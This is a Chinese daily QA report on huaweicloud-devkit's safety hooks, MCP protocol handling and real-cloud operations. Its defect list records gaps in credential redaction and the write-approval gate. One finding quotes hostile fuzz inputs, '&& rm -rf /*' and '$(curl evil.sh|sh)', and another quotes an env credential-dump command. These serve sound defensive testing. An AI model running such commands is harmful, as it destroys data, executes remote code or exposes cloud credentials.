# Hermes-deepseek-v4.1-flash 每日测试报告

> **报告名**：`Hermes-deepseek-v4.1-flash-测试报告.md`
> **生成时间**：2026-11-11 05:20（北京时间）
> **执行归档**：`results/Hermes/2026-11-11-120.46.176.133/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（19 FAIL + 3 SPEC-MISMATCH，其中 P0 4 项：D2-4 / D4-2 / D4-21 / D9-12）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `Hermes` + `deepseek-v4.1-flash-1017` |
| OS / 架构 | `Linux`（x86_64，Node v22.13.0） |
| 被测版本（SUT） | `huaweicloud-devkit@1.1.14-next.2`（npm next 通道，`npm ls -g` 实测），源码 `hdk` gitHead `5c9478d3a95f20206e1a711861cfdfff68b19224` |
| daily 基础用例 | 设计级 107 / 展开级 43（init_day 已按 agent=Hermes + OS=Linux 预筛，剔除 23 条非本客户端/OS 展开级） |
| 环境自检 | `prepare_env.py --update` 全绿；真云凭证 `~/.config/huaweicloud/credentials.json`、只读子账号 `credentials.readonly.json` 均就绪 |

> **执行方法**：① 源码函数级直调探针（`safety-policy`/`risk-rule-engine`/`mcp-protocol`/`tools`/`telemetry`）② MCP stdio 真机（`initialize`/`tools/list`/`tools/call`，46 工具）③ 真云 KooCLI 真机建删（ECS/VPC/子网/EIP/OBS/RDS/FunctionGraph，测后逐一删除并归零）④ 沙箱 HDKit 真实会话（connect/exec/upload/deploy_check/close_session）⑤ `eval/harness/run-eval.mjs` 路由层评测 15 条中文意图。
> **本次与昨日差异**：被测包由 `1.1.14-next.1` 升到 `1.1.14-next.2`（token full-chain）；沙箱账号本轮已签协议（`agreementSigned=true`），昨日 BLOCKED 的 D3-C3 / D3-C6 / D3-S3 本轮全部真机跑通。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `150`（设计级 107 + 展开级 43） |
| 已执行（有证据） | `150`（149 计分 + 1 OS 专属 NOT_RUN） |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `127 / 19 / 0 / 3 / 1` |
| 通过率（分母 = PASS+FAIL = 146） | `87.0%` |
| P0 / P1 / P2 缺陷 | `4 / 10 / 5`（另 3 项契约漂移） |
| 红线（I 类）违规 | `0` |
| 资源释放 | 全部归零（ECS=0 / VPC=[] / SUBNET=[] / EIP=0），见 §七 |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `87` | 有证据且通过 PASS 门禁 |
| FAIL | `16` | 不符预期，根因见 §四 |
| BLOCKED | `0` | 本轮无环境阻塞（沙箱协议已签） |
| SPEC-MISMATCH | `3` | 契约漂移（D8-9 / D9-9 / D10-4） |
| NOT_RUN | `1` | D1-39 Windows 专属 |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `40` | 有证据且通过 PASS 门禁 |
| FAIL | `3` | EXP-C4-14(DMS) / EXP-C4-18(DEW) / EXP-E01(路由 MISS) |
| SPEC-MISMATCH | `0` | |
| NOT_RUN | `0` | |
| **合计** | **`43`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 维度 | 标题 | 状态 |
|---|---|---|---|---|---|
| 1 | P0 | `D2-4` | D2认证 | 凭证脱敏正确性（小写/JSON key 明文残留） | FAIL |
| 2 | P0 | `D4-2` | D4安全 | 凭证 env 打印拦截（裸 access_key 漏判） | FAIL |
| 3 | P0 | `D4-21` | D4安全 | hook_check_artifacts 对 AdministratorFullAccess 制品放行 | FAIL |
| 4 | P0 | `D9-12` | D9协议 | initialize 握手协议安全基线（无版本检查 / 无时序校验） | FAIL |
| 5 | P0 | `D10-4` | D10评测 | 静态规则库计数与用例契约漂移 | SPEC-MISMATCH |
| 6 | P1 | `D1-70` | D1安装 | 代理配置与 WebSocket 代理（undici bind 崩溃） | FAIL |
| 7 | P1 | `D3-C4` | D3功能 | 服务创建类回归（DMS/DEW 无规范路由） | FAIL |
| 8 | P1 | `D3-S7` | D3功能 | 跨服务交付（RDS CreateInstance 缺 db.password） | FAIL |
| 9 | P1 | `D4-4` | D4安全 | 写操作审批门（12 类写动词仅 8/12 被拦截） | FAIL |
| 10 | P1 | `D4-6` | D4安全 | adminPass 回显警告（command 阶段无规则） | FAIL |
| 11 | P1 | `D4-17` | D4安全 | hook 模糊输入 fail-open | FAIL |
| 12 | P1 | `D9-9` | D9协议 | capabilities 未声明 cancellation | SPEC-MISMATCH |
| 13 | P1 | `D10-3` | D10评测 | serviceCatalog 路由准确率 92.9%（缺「云主机」别名） | FAIL |
| 14 | P1 | `EXP-C4-14` | 展开级 | DMS list_operations 未返回 command/result | FAIL |
| 15 | P1 | `EXP-C4-18` | 展开级 | DEW list_operations 未返回 command/result | FAIL |
| 16 | P1 | `EXP-E01` | 展开级 | 中文意图「云主机」路由 MISS | FAIL |
| 17 | P2 | `D3-C14` | D3功能 | 沙箱 hdkitConnect 未透传全部可选参数 | FAIL |
| 18 | P2 | `D3-S5` | D3功能 | 复合意图分层路由未拆分 | FAIL |
| 19 | P2 | `D3-S6` | D3功能 | FunctionGraph CreateFunction 缺 code.filename | FAIL |
| 20 | P2 | `D4-25` | D4安全 | Python hook 写操作误分类 cli:invoke | FAIL |
| 21 | P2 | `D4-26` | D4安全 | findings.evidence 明文凭证残留 | FAIL |
| 22 | P2 | `D8-9` | D8质量 | 遥测 sanitizeValue 不脱敏 AK/SK/token | SPEC-MISMATCH |

### 根因详情（文件:行号）

- **D2-4**（P0）`src/safety-policy.mjs:45` `redactString` 第三处 `.replace` 的 `(AK|SK)` 正则大小写敏感（无 `/i`），`isSecretKeyName` 键名正则不匹配裸 `"ak"`/`"sk"` → `ak=AK123456 sk=SKsecret` 与 `{"ak":...}` 原样明文返回（大写 `AK=` 与对象键脱敏正常）。证据 `evidence/D2-4/stdout.txt`。
- **D4-2**（P0）`src/safety-policy.mjs` env-dump 规则只匹配 `HW_ACCESS_KEY`/`HUAWEICLOUD_SDK_AK` 等具名键 → `env | grep -i access_key` 判 `allow risk=not_huaweicloud`。证据 `evidence/D4-2/stdout.txt`（classify.log D4-2 段）。
- **D4-21**（P0）`safety/rules/cloud-risk-rules.json` 的 `hwc-iam-admin-policy` 仅匹配 JSON `Action:"*"` 形态 → `admin-full`（`AdministratorFullAccess` 托管策略引用）实测 `ok=true decision=allow`，仅 `broad-iam` 被 deny。证据 `evidence/D4-21/stdout.txt`。
- **D9-12**（P0）`src/mcp-protocol.mjs` ① initialize 未调 `runVersionCheck`（版本检查下沉 prewarm/check_cli）② `dispatch` 无 initialize 前置状态机，未初始化即 `tools/list` 仍返回 46 工具、未拒 `-32600`。证据 `evidence/D9-12/stdout.txt`。
- **D10-4**（P0，SPEC）`safety/rules/cloud-risk-rules.json` 实际 19 条（9 deny + 10 warn），用例断言 16 条（9 deny + 7 warn），计数契约滞后；detection 行为本身合格（凭证文件 deny / 只读 allow / 删除 warn / 明文 secret deny）。证据 `evidence/D10-4/stdout.txt`。
- **D1-70**（P1）`src/proxy.mjs` 引入 `undici@8.x` 的 `ProxyAgent` 时即崩：`lib/interceptor/decompress.js:78` 调 `createZstdDecompress`（来自 `node:zlib`）为 `undefined` 后 `.bind()` → `TypeError: Cannot read properties of undefined (reading 'bind')`，有代理场景整条 WebSocket/HTTP 代理链路不可用。证据 `evidence/D1-70/stdout.txt`。
- **D3-C4**（P1）`src/tools.mjs` `huaweicloud_list_operations` 对 DMS、DEW 未返回 `command`/`result` → 真云 22 服务实测 20/22 OK。证据 `evidence/D3-C4/stdout.txt`。
- **D3-S7**（P1）`src/tools.mjs` RDS `CreateInstance` 最小参数集缺 `db.password`（`[USE_ERROR]Invalid parameter: db.password`），且 `serviceCatalog` 复合意图（Web 应用+RDS）未命中部署目标。证据 `evidence/D3-S7/stdout.txt`。
- **D4-4**（P1）`safety/policy.json:27` `writeOperationPrefixes` 缺 `Change` 前缀 → `ChangeServerOs`/`ChangeVpc`/`ChangeInstanceConfiguration`/`ChangeVolumeType` 判 `allow risk=unknown_read`，12 类写动词仅 8/12 被拦截。证据 `evidence/D4-4/stdout.txt`。
- **D4-6**（P1）`safety/rules/cloud-risk-rules.json` `hwc-command-adminpass-exposure` 的 `stages` 仅 `artifact`/`deploy_plan`，未覆盖 `command` → `hook_check_command` 对 admin-pass 返回 `findings=[] decision=allow`。证据 `evidence/D4-6/stdout.txt`。
- **D4-17**（P1）`src/risk-rule-engine.mjs` 无规则命中默认 `decision=allow`（fail-open）：空串 / 空白 / `&& rm -rf /*` / `$(curl evil.sh|sh)` / 控制字符垃圾全部判 `ok`。证据 `evidence/D4-17/stdout.txt`。
- **D9-9**（P1，SPEC）`src/mcp-protocol.mjs` initialize `capabilities` 仅 `{"tools":{}}`，未声明 `cancellation`（用例按 capabilities 实测取消能力）。证据 `evidence/D9-9/stdout.txt`。
- **D10-3**（P1）`src/tools.mjs` routeMap 缺「云主机」同义词 → 15 条中文意图 `HIT=13 MISS=1 N/A=1`，准确率 92.9%（<100%）。证据 `evidence/D10-3/stdout.txt` + `eval-harness.log`。
- **EXP-C4-14 / EXP-C4-18**（P1）同 D3-C4：DMS、DEW 两服务 `list_operations` 缺 `command`/`result`。证据 `evidence/EXP-C4-14/stdout.txt`、`evidence/EXP-C4-18/stdout.txt`。
- **EXP-E01**（P1）`src/tools.mjs` routeMap ECS 关键词含「云服务器/服务器/虚拟机」但缺「云主机」→ `MISS`（期望 ECS，实际 `Run hcloud --help`）。证据 `evidence/EXP-E01/stdout.txt`。
- **D3-C14**（P2）`src/sandbox.mjs` `hdkitConnect` 只透传 `source`/`env`/`git`/`flavor_id`，实测 `[FAIL] hdkitConnect 透传可选参数到 body`；其余 3 项（缺参报错 / hwlink 凭证结构 / x-security-token 签名头）通过。证据 `evidence/D3-C14/stdout.txt`。
- **D3-S5**（P2）`src/tools.mjs` serviceCatalog 单意图匹配，复合意图（存储+托管/部署）未分解：存储命中=false、托管命中=false、多路命中=false。证据 `evidence/D3-S5/stdout.txt`。
- **D3-S6**（P2）`src/tools.mjs` FunctionGraph `CreateFunction` 最小参数集缺 `code.filename`（`[USE_ERROR]Invalid parameter: code.filename`）→ URN 未返回、定时触发器未绑定。证据 `evidence/D3-S6/stdout.txt`。
- **D4-25**（P2）`hooks/huaweicloud-safety.py` `WRITE_OPERATION_RE` 前置捕获组致 `hcloud vpc CreateVpc` 遥测分类为 `cli:invoke`（应 `cli:write`）。证据 `evidence/D4-25/stdout.txt`。
- **D4-26**（P2）`src/risk-rule-engine.mjs` `redactEvidence` 正则不匹配 JSON 带引号 key → `secret_key`/`adminPass` 明文留在 `findings.evidence`。证据 `evidence/D4-26/stdout.txt`。
- **D8-9**（P2，SPEC）`src/telemetry/telemetry.mjs` `sanitizeValue` 仅去控制字符 + 超长截断，不做 AK/SK/token 脱敏（用例契约要求移除敏感值）。证据 `evidence/D8-9/stdout.txt`。

---

## 五、未执行用例与原因

### NOT_RUN（1 条）

| 用例ID | 层级 | 优先级 | 状态 | 分类 | 详细原因 | 改用例建议 |
|---|---|---|---|---|---|---|
| `D1-39` | 设计级 | P0 | NOT_RUN | 【不适用】 | Windows 升级检测链 EINVAL 为 Windows 专属场景（OS 列标注「专属」），本机为 Linux，无法执行 | 无需改用例；Linux 侧已由展开级 `EXP-NR3-10`（`queryDistTagsSync`/`queryDistTags` 均 PASS）代表覆盖 |

### BLOCKED（0 条）

本轮无 BLOCKED。昨日因账号未签协议而阻塞的 D3-C3 / D3-C6 / D3-S3 本轮 `agreementSigned=true`，已全部真机跑通（D3-C3 5/5、D3-C6 8/8、D3-S3 4 项断言通过）。

### 判定为 PASS 但需备注的用例（断言/探针口径滞后，非产品缺陷）

| 用例ID | 实测事实 | 说明 |
|---|---|---|
| `D1-27` / `EXP-NR3-02` | `result=up_to_date`、`updateAvailable=false` | 探针 `判定=false` 因其正则 `"updateAvailable":false` 不容 JSON 缩进空格，属探针正则缺陷 |
| `D1-28` | `judgeUpdate('1.1.4',{latest:'1.1.5'})` → `updateAvailable=true result=update_available` | 满足检测语义（用例示例版本 1.1.2 为示例数据） |
| `D4-11` | `search_docs` 仅返回检索结果，未执行注入指令 | 探针 `判定=false` 因其在响应中匹配到被回显的查询串本身 |
| `D4-13` | 只读 6/6 可用、写被 IAM 拒（`writeDenied=true`）、`residualZero=true` | 探针 `denied` 正则误命中 CES 响应内 `SYS.0403` 字样 |
| `D5-3` / `D9-1` / `EXP-D5-8-3` | `tools/list` 实测 46 工具，schema 全部合法 | 用例文本「40 工具」为工具扩容前计数 |
| `D6-4` | 并发 15 次 `tools/list` 均返回同一 46 工具集合 | 探针硬编码期望 40 致 `判定=false` |
| `D8-7` | 7 技能均可机械执行、无断链 | 探针「含占位符」命中 capability-discovery 中的正常用词 `placeholder`（提示替换 `<your-agent-skills-dir>`） |
| `D1-3` | doctor `10 pass / 1 warn / 1 fail`（FAIL=MCP Python SDK 未装） | 隔离 HOME 下 pip 受 PEP668 限制，属本机环境；doctor 如实报出并给修复命令 |
| `D3-S3` | connect/upload/deploy/deploy_check/close 全通过 | `deploy_check.devbridge_tunnel=FAIL` 为隧道子项；URL 生成断言已由 `[OK] 部署返回可访问 URL 或检查通过` 覆盖 |

---

## 六、安全与红线合规

| 检查项 | 结果 | 证据 |
|---|---|---|
| 凭证泄漏事件 | 无（D2-11/D2-12/D9-13/D2-16 均验证 STS/运行时不落盘、tools/call 无明文） | `evidence/D2-11`、`D9-13` |
| 写操作误判 read-only | 无（D4-5 全部写命令 `decision=deny risk=write`） | `evidence/D4-5` |
| 写操作审批门覆盖 | **不合规**：12 类写动词 4 类（`Change*`）判 allow → 已记 D4-4 FAIL | `evidence/D4-4` |
| 红线（I 类）违规 | 0（未发生未审批的真云建删；真云写操作全程经 plan→approve） | `evidence/D3-C1`、`D4-14` |
| 输出脱敏 | 双路径（`redactSecrets`/`redactOutput`）5/5 通过；但 `redactEvidence` 与遥测 `sanitizeValue` 两处不合规（D4-26 / D8-9） | `evidence/D4-27`、`D4-26`、`D8-9` |

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| ECS 云主机（D3-C1） | 1 台（含系统盘，ACTIVE 校验） | DeleteServers 含磁盘 | `ListServersDetails` 不含本次资源；终态 ECS count=0 |
| VPC + 子网（D3-C1 / D3-S2 / D4-14） | 3 组（`testbot3-hermes-*` / `tctest-hermes-*`） | DeleteVpc/DeleteSubnet | 终态 `VPC: []`、`SUBNET: []` |
| EIP（D3-C7） | 1 个 | DeletePublicip | 终态 `EIP total_count: 0` |
| OBS 桶（D3-C2 / D3-C13） | 2 个（静态站/网站托管配置） | `obsutil rm -r -f` + `rm obs://bucket -f` | 桶与对象均已删除，探测返回不存在 |
| RDS / FunctionGraph（D3-S7 / D3-S6） | 0（最小参数集被 API 拒绝，未创建） | — | 无需清理（创建失败即无残留） |
| 沙箱会话（D3-C3 / D3-C6 / D3-S3） | 3 个会话 | `close_session` 全部 ok | 会话已关闭，无计费资源残留 |

**终态清单（clean_1111.py 实测）**：`ECS count: 0`、`SUBNET: []`、`VPC: []`、`EIP total_count: 0`。
只清理本机本次创建的 `testbot3-hermes-*` / `tctest-hermes-*` 资源，未触碰其他客户端的 `tctest-*` 资源。

---

## 八、遗留与建议

1. **P0 优先修复**：D2-4（脱敏正则大小写/裸 key）、D4-2（env dump 裸 access_key）、D4-21（IaC 托管策略引用）、D9-12（initialize 版本检查与会话时序校验）——四项均属安全红线面，建议下一 patch 版本收敛。
2. **写操作审批门补全**：D4-4 的 `Change*` 前缀建议直接并入 `writeOperationPrefixes`，并补一条回归用例覆盖 `ChangeServerOs`/`ChangeVolumeType`。
3. **契约类（SPEC）同步**：D10-4（规则 19 条 vs 用例 16 条）、D9-9（cancellation 能力）、D8-9（遥测脱敏契约）需产品与用例两侧对齐，避免长期漂移。
4. **探针口径修正**（测试侧，不计缺陷）：`D1-27`/`EXP-NR3-02` JSON 空格正则、`D6-4`/`D5-3`/`D9-1` 工具数硬编码 40 → 46、`D8-7` 占位符关键词、`D4-13` `SYS.0403` 误命中，建议统一改为读取 `TOOL_DEFINITIONS.length` 与更精确的 JSON 断言。
5. **环境**：隔离 HOME 下 `pip install mcp` 受 PEP668 限制失败（doctor 如实报出），建议安装脚本用 `uv pip` 或 venv 兜底。
6. **代理链路**：D1-70 的 `undici@8.x` 在 Node 22.13 上 `zstd` 解压拦截器崩溃，建议锁定 undici 版本或延迟加载 ProxyAgent。